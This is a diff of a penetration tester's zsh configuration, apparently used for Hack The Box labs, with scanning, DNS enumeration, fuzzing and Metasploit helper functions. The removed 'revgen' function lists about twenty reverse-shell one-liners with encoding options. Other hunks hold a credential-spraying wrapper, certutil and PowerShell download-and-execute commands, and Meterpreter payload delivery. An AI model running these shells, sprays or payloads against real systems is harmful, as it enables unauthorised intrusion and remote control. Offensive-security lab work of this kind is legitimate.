@@ -1,6 +1,7 @@
 
 #Program aliases
 alias htb='sudo openvpn /home/damuna/Downloads/lab_Damuna.ovpn'
+alias academy='sudo openvpn /home/damuna/Downloads/academy-regular.ovpn'
 alias tunip="ip -o -4 addr show tun0 | awk '{print \$4}' | cut -d'/' -f1"
 alias gettgtpkinit.py="/home/damuna/TOOLS/PKINITtools/venv/bin/python3 /home/damuna/TOOLS/PKINITtools/gettgtpkinit.py"
 alias pygpoabuse="/home/damuna/TOOLS/pyGPOAbuse/venv/bin/python3 /home/damuna/TOOLS/pyGPOAbuse/pygpoabuse.py"
@@ -19,12 +20,6 @@ portscan() {
   tmux resize-pane -t $dom -x 50%
   tmux attach -t $dom
 }
-
-proxytcp(){
-    echo -e "\nTCP (TOP-1000) OPEN SCANNING\n"
-    sudo proxychains -q nmap -sCV -n -Pn --disable-arp-ping -sT -v --top-ports 1000 --open $1 | grep -iE "^\||[0-9]/tcp" --color=never
-}
-
 
 tcp(){
     echo -e "\nTCP (TOP-3000) OPEN SCANNING\n"
@@ -73,36 +68,6 @@ udp(){
         echo "NO UDP PORTS FOUND"
     fi
     sudo rm /tmp/$1_UDP.txt
-}
-
-# NXC Spraying Wrapper
-nxcspray(){
-    protocols=("smb" "ldap" "winrm" "rdp" "mssql" "vnc" "ssh" "ftp" "wmi" "nfs")
-    for protocol in "${protocols[@]}"; do
-        echo -e "[+] SPRAYING PROTOCOL \"$protocol\" WITH PARAMETERS:\n    HOSTS -> \"$1\"\n    USERS -> \"$2\"\n    CREDS -> \"$3\"\n"
-
-        echo -e "[+] - Domain Authentication"
-        if [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
-            nxc $protocol $1 -u $2 -p $3 --continue-on-success | grep -v "STATUS_LOGON_FAILURE"
-        else
-            nxc $protocol $1 -u $2 -p $3 --continue-on-success | grep -v "STATUS_LOGON_FAILURE"
-        fi
-
-        echo -e "[+] - Local Authentication"
-        if [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
-            nxc $protocol $1 -u $2 -p $3 --continue-on-success --local-auth | grep -v "STATUS_LOGON_FAILURE"
-        else
-            nxc $protocol $1 -u $2 -H $3 --continue-on-success --local-auth | grep -v "STATUS_LOGON_FAILURE"
-        fi
-
-        echo -e "[+] - Kerberos Authentication"
-        read -r dc_fqdn\?"[+] - Input DC FQDN: "
-        if [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
-            nxc $protocol $1 -u $2 -p $3 -k --kdcHost $dc_fqdn --continue-on-success | grep -v "STATUS_LOGON_FAILURE"
-        else
-            nxc $protocol $1 -u $2 -H $3 -k --kdcHost $dc_fqdn --continue-on-success | grep -v "STATUS_LOGON_FAILURE"
-        fi
-    done
 }
 
 
@@ -321,6 +286,7 @@ nscan(){
     fi
     
     if [[ "$service" == "dns" ]]; then  
+
         echo -e "\n[+] PTR DOMAIN RECORDS OF NS/INTERNAL IPs\n"
         dnsrecon -r $1/30 -n $1
         dnsrecon -r 127.0.0.0/24 -n $1
@@ -333,6 +299,7 @@ nscan(){
         	read -r dnsdom\?"[+] INPUT A DOMAIN TO ENUMERATE (CTRL-C TO EXIT): "
         	if [[ ! -z $dnsdom ]]; then
                     rm /tmp/ns_$dnsdom.txt /tmp/zones_$dnsdom.txt &>/dev/null
+
                     echo -e "\n[+] REQUESTING AD DOMAIN RECORDS\n"
                     nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='$dnsdom'"
 
@@ -341,34 +308,27 @@ nscan(){
                     ref_chk=$(dig ns $dnsdom @$1 -p $2 | grep REFUSED | grep -v "timed out")
 
                     if [[ ! -z $ref_chk || -z $ns_records ]]; then
-                        echo -e "\n[+] REQUESTING \"A\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
+                        echo -e "\n[+] REQUESTING \"A / AAAA\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                         dig a $dnsdom @$1 -p $2 +short
-
-                        echo -e "\n[+] REQUESTING \"AAAA\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                         dig aaaa $dnsdom @$1 -p $2 +short
 
-                        echo -e "\n[+] REQUESTING \"MX\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
+                        echo -e "\n[+] REQUESTING \"MX / TXT\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                         dig mx $dnsdom @$1 -p $2 +short
-
-                        echo -e "\n[+] REQUESTING \"TXT\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                         dig txt $dnsdom @$1 -p $2 +short
 
                         echo -e "\n[+] REQUESTING \"CNAME\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                         dig cname $dnsdom @$1 -p $2 +short
 
-                        echo -e "\n[+] REQUESTING \"HINFO\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
-                        dig hinfo $dnsdom @$1 -p $2 +short
-
                         echo -e "\n[+] REQUESTING \"ANY\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
-                        dig any $dnsdom @$1 -p $2 +noall +answer | awk '{for(i=1;i<=3;i++) $i=""; sub(/^[ \t]+/, ""); print}' | awk -F '\t' '{print $1 "\t" $2}'
+                        dig any $dnsdom @$1 -p $2 +short
 
                         if [[ ! -z $ns_records ]]; then
                             echo -e "[+] NS REQUEST WAS REFUSED, ATTEMPTING ZONE TRANSFER OVER DNS IP\n"
-                            axfr_resp=$(dig axfr $dnsdom @$1 -p $2 +noall +answer | grep -v "timed out")
+                            axfr_resp=$(dig axfr $dnsdom @$1 -p $2 | grep $dnsdom --color=never | tail -n +2)
 
                             if [[ -z $axfr_resp ]]; then
                                 echo -e "\n[+] ZONE TRANSFER FAILED, BRUTEFORCING DOMAINS (TOP-110000)\n"
-                                echo $2 > /tmp/ns_$dnsdom.txt
+                                echo $1 > /tmp/ns_$dnsdom.txt
                                 cur=$(pwd) && cd ~/TOOLS/subbrute
                                 python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                                 cd $cur
@@ -381,8 +341,8 @@ nscan(){
                     if [[ ! -z $ns_records && -z $ref_chk ]]; then
                         echo $ns_records > /tmp/zones_$dnsdom.txt && touch /tmp/ns_$dnsdom.txt
                         while read zone; do
-                            ip_chk=$(dig a ${zone%.} @$1 -p $2 +short)
-                            if [[ $ip_chk == "127.0.0.1" || -z $ip_chk ]]; then
+                            ip_chk=$(dig a ${zone%.} @$2 +short)
+                            if [[ $ip_chk == "127.0.0.1" || -z $ip_chk ]]; then 
                                 echo $1 >> /tmp/ns_$dnsdom.txt
                             else
                                 echo $ip_chk >> /tmp/ns_$dnsdom.txt
@@ -390,39 +350,31 @@ nscan(){
                         done < /tmp/zones_$dnsdom.txt
                         cat /tmp/ns_$dnsdom.txt | sort -u > /tmp/tmp_ns_$dnsdom.txt && mv /tmp/tmp_ns_$dnsdom.txt /tmp/ns_$dnsdom.txt
 
-                        echo -e "\n[+] REQUESTING \"A\" RECORDS\n"
+                        echo -e "\n[+] REQUESTING \"A / AAAA\" RECORDS FOR \"$dnsdom\" OVER ALL ZONES\n"
                         while read zone; do
                             dig a $dnsdom @$zone -p $2 +short
-                        done < /tmp/ns_$dnsdom.txt
-
-                        echo -e "\n[+] REQUESTING \"AAAA\" RECORDS\n"
-                        while read zone; do
                             dig aaaa $dnsdom @$zone -p $2 +short
                         done < /tmp/ns_$dnsdom.txt
 
-                        echo -e "\n[+] REQUESTING \"MX\" RECORDS\n"
+                        echo -e "\n[+] REQUESTING \"MX / TXT\" RECORDS FOR \"$dnsdom\" OVER ALL ZONES\n"
                         while read zone; do
                             dig mx $dnsdom @$zone -p $2 +short
-                        done < /tmp/ns_$dnsdom.txt
-
-                        echo -e "\n[+] REQUESTING \"TXT\" RECORDS\n"
-                        while read zone; do
                             dig txt $dnsdom @$zone -p $2 +short
                         done < /tmp/ns_$dnsdom.txt
 
-                        echo -e "\n[+] REQUESTING \"CNAME\" RECORDS\n"
+                        echo -e "\n[+] REQUESTING \"CNAME\" RECORDS FOR \"$dnsdom\" OVER ALL ZONES\n"
                         while read zone; do
                             dig cname $dnsdom @$zone -p $2 +short
                         done < /tmp/ns_$dnsdom.txt
 
-                        echo -e "\n[+] REQUESTING \"ANY\" RECORDS\n"
+                        echo -e "\n[+] REQUESTING \"ANY\" RECORDS FOR \"$dnsdom\" OVER ALL ZONES\n"
                         while read zone; do
-                            dig any $dnsdom @$zone -p $2 +noall +answer | awk '{for(i=1;i<=3;i++) $i=""; sub(/^[ \t]+/, ""); print}' | awk -F '\t' '{print $1 "\t" $2}'
+                            dig any $dnsdom @$zone -p $2 +short
                         done < /tmp/ns_$dnsdom.txt
 
                         echo -e "\n[+] ATTEMPTING ZONE TRANSFER OVER ALL ZONES\n"
                         while read zone; do
-                            axfr_resp=$(dig axfr $dnsdom @$zone -p $3 +noall +answer | grep -v "timed out")
+                            axfr_resp=$(dig axfr $dnsdom @$zone -p $2 | grep $dnsdom --color=never | tail -n +2 | grep -v "timed out")
                             if [[ ! -z $axfr_resp ]]; then
                                 echo $axfr_resp
                                 break
@@ -439,10 +391,9 @@ nscan(){
 	    done
 
         echo -e "\n[+] MSF ENUMERATION\n"
-        msfconsole -q -x "use auxiliary/scanner/dns/dns_amp; set RHOSTS $2; set RPORT $3; exploit; exit"
-        msfconsole -q -x "use auxiliary/gather/enum_dns; set RHOSTS $2; set RPORT $3; exploit; exit"
+        msfconsole -q -x "use auxiliary/scanner/dns/dns_amp; set RHOSTS $1; set RPORT $2; exploit; exit"
+        msfconsole -q -x "use auxiliary/gather/enum_dns; set RHOSTS $1; set RPORT $2; exploit; exit"
     fi
-        
 
     if [[ "$service" == "nfs" ]]; then
         echo "Available NFS shares on $1:"
@@ -849,10 +800,10 @@ extfuzz(){
     select_extension
     echo -e "\n--------------------RECURSIVE EXTENSION FUZZING------------------\n"
     urlgen $1
-    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /home/damuna/WORDLISTS/combined_words_no_dot.txt -e $ext
+    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/combined_words.txt -e $ext
 
     echo -e "\n--------------------NON RECURSIVE EXTENSION FUZZING------------------\n"
-    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -ic -u $1/FUZZ -c -w /home/damuna/WORDLISTS/combined_words_no_dot.txt -e $ext 
+    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -ic -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/combined_words.txt -e $ext 
 }
 
 # Directory Discovery
@@ -913,108 +864,17 @@ tplscan(){
 listen(){
     sudo rlwrap -car nc -lvnp $1
 }
-
-
-# Meterpreter Listener
-msflisten(){
-    if [[ -z $1 ]]; then
-        echo -e "\n[-] USAGE: \"msflisten [PORT]\"\n"
-        exit 0
-    fi
-    chnic
-    while true; do
-        read -r os\?"[+] SELECT OS (win32 / win64 / lin32 / lin64): "
-        if [[ $os == "win32" ]]; then
-            echo -e "\n[+] OPENING MSF LISTENER ON \"$ip:$1\"\n"
-            msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $inter; set LPORT $1; run;"
-            break
-        elif [[ $os == "win64" ]]; then
-            echo -e "\n[+] OPENING MSF LISTENER ON \"$ip:$1\"\n"
-            msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $inter; set LPORT $1; run;"
-            break
-        elif [[ $os == "lin32" ]]; then
-            echo -e "\n[+] OPENING MSF LISTENER ON \"$ip:$1\"\n"
-            msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $inter; set LPORT $1; run;"
-            break
-        elif [[ $os == "lin64" ]]; then
-            echo -e "\n[+] OPENING MSF LISTENER ON \"$ip:$1\"\n"
-            msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST $inter; set LPORT $1; run;"
-            break
-        else
-            echo -e "\n[-] INVALID OS CHOICE, PLEASE TRY AGAIN\n"
-        fi
-    done
-}
-
-
 smtpserv(){
     chnic
     echo -e "OPENING SMTP 'DebuggingServer' AT $ip:2525\n"
     python2 -m smtpd -n -c DebuggingServer $ip:2525
 }
 
-httpsserv() {
-    chnic
-    local port="$1"
-    local cert_file="/tmp/cert.pem"
-    local key_file="/tmp/key.pem"
-    
-    # Check if port is provided
-    if [ -z "$port" ]; then
-        echo "Usage: httpsserv <port>"
-        return 1
-    fi
-
-    # Generate certificate if it doesn't exist
-    if [ ! -f "$cert_file" ] || [ ! -f "$key_file" ]; then
-        echo "Generating self-signed certificate..."
-        openssl req -x509 -newkey rsa:2048 -keyout "$key_file" -out "$cert_file" \
-            -days 365 -nodes -subj '/CN=localhost' >/dev/null 2>&1
-    fi
-
-    # Display certificate info
-    echo "Certificate saved in: $cert_file"
-    openssl x509 -in "$cert_file" -noout -text | head -n 11
-    echo ""
-
-    # Start the HTTPS server using Python in foreground
-    echo "Starting HTTPS server on https://$ip:$port"
-    echo "Press Ctrl+C to stop the server"
-    echo "----------------------------------------"
-    
-    sudo python3 -c "
-import http.server
-import ssl
-import os
-
-port = $port
-cert_file = '$cert_file'
-key_file = '$key_file'
-
-# Create SSL context with modern approach
-context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-context.load_cert_chain(certfile=cert_file, keyfile=key_file)
-
-httpd = http.server.HTTPServer(('"$ip"', port), http.server.SimpleHTTPRequestHandler)
-httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
-
-print(f'HTTPS server running on https://$ip:{port}')
-print('Serving current directory:', http.server.os.getcwd())
-print('----------------------------------------')
-httpd.serve_forever()
-"
-}
-
 httpserv(){ 
-    if [[ -z $1 ]]; then
-        echo -e "\n[-] USAGE: httpserv [PORT]\n"
-        exit 0
-    fi
     chnic
-    echo -e "OPENING HTTP SERVER AT http://$ip:$1\n"
-    echo -e "WINDOWS COMMANDS:\n"
-    echo -e "- certutil.exe -urlcache -split -f http://$ip:$1/[INPUT] [OUTPUT]'"
-    echo -e "- powershell.exe -c iex(iwr -useb -uri http://$ip:8888/FILE.ps1)"
+    echo -e "OPENING HTTP SERVER AT http://$ip:8888"
+    echo -e "WINDOWS cmd: 'certutil.exe -urlcache -split -f http://$ip:8888/[INPUT] [OUTPUT]'"
+    echo -e "WINDOWS powershell: 'iex(iwr -useb -uri http://$ip:8888/FILE.ps1)'"
     python3 -m http.server 8888 >/dev/null
 }
 
@@ -1087,137 +947,31 @@ wordgen(){
     cewl $1 -d 2 -m 4 --lowercase --with-numbers -w wordlist_custom.txt
 }
 
-
-# Reverse Linux Command Shell Generator
-revgen(){
-    echo -e "\n[+] SELECT LISTENER INTERFACE\n"
-    chnic
-    read -r lport\?"[+] INPUT LISTENER PORT: "
-    read -r rhost\?"[+] INPUT PAYLOAD IP (Leave blank for: \"$ip\"): "
-    if [[ -z $rhost ]]; then
-        rhost=$ip
-    fi
-    read -r rport\?"[+] INPUT PAYLOAD PORT (Leave blank for: \"$lport\"): "
-    if [[ -z $rport ]]; then
-        rport=$lport
-    fi
-
-    read -r enc\?"[+] SELECT ENCODING: (plain, b64, url): "
-    echo -e "\n[+] GENERATING AND SAVING REVERSE SHELL COMMANDS IN \"revshells_$inter.txt\"\n"
-
-    cmds=("sh -i >& /dev/tcp/$rhost/$rport 0>&1"
-          "0<&196;exec 196<>/dev/tcp/$rhost/$rport; sh <&196 >&196 2>&196"
-          "exec 5<>/dev/tcp/$rhost/$rport;cat <&5 | while read line; do $line 2>&5 >&5; done"
-          "sh -i 5<> /dev/tcp/$rhost/$rport 0<&5 1>&5 2>&5"
-          "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $rhost $rport >/tmp/f"
-          "nc $rhost $rport -e sh"
-          "busybox nc $rhost $rport -e sh"
-          "nc -c sh $rhost $rport"
-          "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $rhost:$rport > /tmp/s; rm /tmp/s"
-          "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$rhost:$rport\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"
-          "php -r '\$sock=fsockopen(\"$rhost\",$rport);popen(\"sh <&3 >&3 2>&3\", \"r\");'"
-          "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$rhost\",$rport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
-          "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$rhost\",$rport));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"
-          "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"$rhost\",\"$rport\");loop{c.gets.chomp!;(exit! if \$_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}'"
-          "socat TCP:$rhost:$rport EXEC:'sh',pty,stderr,setsid,sigint,sane"
-          "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$rhost','$rport');os.execute('sh -i <&3 >&3 2>&3');\""
-          "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$rhost:$rport\");cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
-          "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e sh $rhost $rport 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"
-          "awk 'BEGIN {s = \"/inet/tcp/0/$rhost/$rport\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
-          "C='curl -Ns telnet://$rhost:$rport'; \$C </dev/null 2>&1 | sh 2>&1 | \$C >/dev/null"
-          )
-
-    for cmd in "${cmds[@]}"; do
-        if [[ $enc == "plain" ]]; then
-            echo -e "$cmd" | tee --append revshells_$inter.txt
-            echo -e ""
-        elif [[ $enc == "b64" ]]; then
-            echo -e "$(echo $cmd|base64 -w0)|base64 -d|sh" | tee --append revshells_$inter.txt
-            echo -e ""
-        elif [[ $enc == "url" ]]; then
-            jq -rn --arg x "${cmd}" '$x|@uri' | tee --append revshells_$inter.txt
-            echo -e ""
-        fi
-    done
-}
-
-
 # Alive Host IP/CIDR Scanning
 alive(){
     cidr_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$"
-    echo "\nRemember Local sweeping:"
-    echo "Linux: for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done"
-    echo "Linux ARP: arp -i [interface] -a "
-    echo "Windows:for %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply""
     if [ -f ./$1 ]; then
-        echo -e "\n[+] FPING SWEEPING\n"
-        fping -qa < $1
-
-        echo -e "\n[+] NMAP SWEEPING\n"
-        sudo nmap -sn -PE -PS80,3389,443 -PP -PU161,40125 -PA21 -g 53 -iL $1 -v
-
-        echo -e "\n[+] NBT SWEEPING\n"
-        sudo nbtscan -r -f $1
-    
-        echo -e "\n[+] NXC SWEEPING\n"
-        nxc smb $1
-        nxc ldap $1
-        nxc winrm $1
-        nxc mssql $1
-        nxc ftp $1
-        nxc wmi $1
-        nxc nfs $1
-        nxc rdp $1
-        nxc ssh $1
+        echo -e "\nNMAP SWEEPING\n"
+        sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 --reason  --disable-arp-ping -iL $1 | grep for | cut -d" " -f5 > alive_ips.txt && cat alive_ips.txt
 
     elif [[ $1 =~ $cidr_regex ]]; then
-    	echo -e "\n[+] FPING SWEEPING\n"
+    	echo -e "\nFPING SWEEPING\n"
 	    fping -asgq $1
 
-        echo -e "\n[+] NMAP SWEEPING\n"
-        sudo nmap -sn -PE -PS80,443,3389 -PP -PU161,40125 -PA21 -g 53 $1 -v
+        echo -e "\nNMAP SWEEPING\n"
+        sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 --reason  --disable-arp-ping $1 | grep for | cut -d" " -f5 > alive_ips.txt && cat alive_ips.txt
 
-        echo -e "\n[+] NBT SWEEPING\n"
-        sudo nbtscan -r $1
-
-        echo -e "\n[+] NXC SWEEPING\n"
-        nxc smb $1
-        nxc ldap $1
-        nxc winrm $1
-        nxc mssql $1
-        nxc ftp $1
-        nxc wmi $1
-        nxc nfs $1
-        nxc rdp $1
-        nxc ssh $1
+        echo -e "\nNMAP TOP 100 TCP SWEEP\n"
+        sudo nmap -n -Pn -g 53 -F --reason --disable-arp-ping $1
     else
-        cidr=$(ip -br a s dev $1 | awk '{print $3}')
-        echo -e "\n[+] SCANNING CIDR \"$cidr\" FOR NETWORK \"$1\"\n"
-        echo -e "\n[+] FPING SWEEPING\n"
-        fping -asgq $cidr
+        echo -e "\nNMAP PING SCANNING IP\n"
+        sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 --reason  --disable-arp-ping $1 | grep for | cut -d" " -f5 > alive_ips.txt && cat alive_ips.txt && rm alive_ips.txt
 
-        echo -e "\n[+] NMAP SWEEPING\n"
-        sudo nmap -sn -PE -PS80,443,3389 -PP -PU161,40125 -PA21 -g 53 $cidr -v
-
-        echo -e "\n[+] NBT SWEEPING\n"
-        sudo nbtscan -r $cidr
-
-        echo -e "\n[+] NXC SWEEPING\n"
-        nxc smb $cidr
-        nxc ldap $cidr
-        nxc winrm $cidr
-        nxc mssql $cidr
-        nxc ftp $cidr
-        nxc wmi $cidr
-        nxc nfs $cidr
-        nxc rdp $cidr
-        nxc ssh $cidr
+        echo -e "\nNMAP TOP 100 TCP SWEEP\n"
+        sudo nmap -n -Pn -g 53 -F --reason --disable-arp-ping $1
     fi
-
-    echo -e "\n[+] IPv6 SWEEPING\n"
-    chnic
-    sudo nmap -v -6 -sn ff02::1%$inter
 }
+
 
 
 vhost(){
@@ -1299,8 +1053,8 @@ metash(){
         read -r lis\?"SELECT CONNECTION (bind / reverse / meterpreter): "
     fi
 
-    read -r lhost\?"INPUT LHOST IP/NIC: "
-    read -r port\?"INPUT LPORT: "
+    read -r lhost\?"INPUT PAYLOAD IP/NIC: "
+    read -r port\?"INPUT PAYLOAD PORT: "
 
     if [[ $os =~ ^lin* ]]; then
         if [[ $os == "lin32" ]]; then
@@ -1544,8 +1298,8 @@ krbconf(){
     echo -e "\nCHECKING DC IP\n"
     dc_ip=$(sudo nmap -p88 $1 -n -Pn --disable-arp-ping -g 53 -T4 --open -oG - | awk '/88\/open/ {print $2}')
     if [[ -z $dc_ip ]]; then
-        echo -e "DC IP NOT FOUND\n"
-        read -r dc_ip\?"INPUT DC IP TO CONFIGURE DOMAIN: "
+        echo -e "DC NOT FOUND, SKIPPING REALM CONFIGURATION"
+        return 1
     fi
 
     if [[ $(echo $dc_ip | wc -l) != "1" ]]; then
@@ -1739,7 +1493,8 @@ osscan(){
     cd $cur
 }
 
-pyenv() {
+# Quick python venv spawner
+pyenv(){
     echo -e "\nSPAWNING VIRTUAL PYTHON3 ENVIRONMENT\n"
     python3 -m venv venv
     source venv/bin/activate
@@ -1750,18 +1505,17 @@ pyenv() {
 
     PY_BIN="$(which python3)"
     PROJECT_DIR="$(pwd)"
+    DEFAULT_NAME="$(basename "$PROJECT_DIR")"
     TOOL_NAME="$(basename "$PROJECT_DIR")"
 
     # Ask which script should be the entrypoint
-    echo -n "Enter script filename to run [default: main.py]: "
-    read SCRIPT_NAME
+    read -p "Enter script filename to run [default: main.py]: " SCRIPT_NAME
     SCRIPT_NAME="${SCRIPT_NAME:-main.py}"
 
     # Create alias in .zshrc
     echo "alias ${TOOL_NAME}='${PY_BIN} ${PROJECT_DIR}/${SCRIPT_NAME}'" >> ~/.zshrc
     echo "✅ Alias '${TOOL_NAME}' added. Run 'source ~/.zshrc' to use it."
 }
-
 
 
 #Responder Server
@@ -1815,18 +1569,13 @@ pfx2key(){
     openssl rsa -in /tmp/out.enc -out "${filename%.*}.key"; rm /tmp/out.enc
     echo "\n SAVED ${filename%.*}.key and ${filename%.*}.crt"
 }
-
-# Meterpreter Delivery Windows Generator
+    
+# Meterpreter Upgrade Windows Generator
 meterup(){
-    echo -e "\n[+] SELECT LISTENER INTERFACE\n"
     chnic
-    nicip=$(ifconfig $nic | grep inet | awk '{print $2}' | head -n 1)   
-    read -r lport\?"[+] INPUT LISTENER PORT: "
-    read -r srvport\?"[+] INPUT HTTP DELIVERY PORT: "
-    read -r os\?"[+] SELECT OS (win32 / win64 / lin32 / lin64): "
+    read -r os\?"SELECT OS (win32 / win64 / lin32 / lin64): "
     if [[ $os =~ "win" ]]; then
-        read -r mtd\?"[+] SELECT DELIVERY METHOD (smb, http, webdav): "
-        
+        read -r mtd\?"SELECT DELIVERY METHOD (smb, http, webdav): "
     fi
 
     pl=""
@@ -1837,7 +1586,7 @@ meterup(){
         if [[ $os == "lin64" ]]; then
             pl="/x64/"
         fi
-        sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload linux${pl}meterpreter/reverse_tcp; set target 7; set LPORT $lport; set LHOST $nic; set SRVHOST $nic; set srvport $srvport; run"
+        sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload linux${pl}meterpreter/reverse_tcp; set target 7; set LHOST $nic; set SRVHOST $nic; run"
     fi
 
     if [[ $os =~ "win" ]]; then
@@ -1850,18 +1599,18 @@ meterup(){
         fi
 
         if [[ $mtd == "smb" ]]; then
-            sudo msfconsole -q -x "use exploit/windows/smb/smb_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LPORT $lport; set LHOST $nic; set SRVHOST $nic; set srvport $srvport; run"
+            sudo msfconsole -q -x "use exploit/windows/smb/smb_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LHOST $nic; set SRVHOST $nic; run"
         fi
 
         if [[ $mtd == "http" ]]; then
-            sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload windows${pl}meterpreter/reverse_tcp; set target 2; set LPORT $lport; set LHOST $nic; set SRVHOST $nic; set srvport $srvport; run;"
+            sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload windows${pl}meterpreter/reverse_tcp; set target 2; set LHOST $nic; set SRVHOST $nic; run"
         fi
 
         if [[ $mtd == "webdav" ]]; then
-            sudo msfconsole -q -x "use exploit/windows/misc/webdav_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LPORT $lport; set LHOST $nic; set SRVHOST $nic; set srvport $srvport; run"
+            sudo msfconsole -q -x "use exploit/windows/misc/webdav_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LHOST $nic; set SRVHOST $nic; run"
         fi
     fi
-}    
+}
 
 # vhd vmsk vhdx Mounter
 vhdMount() {
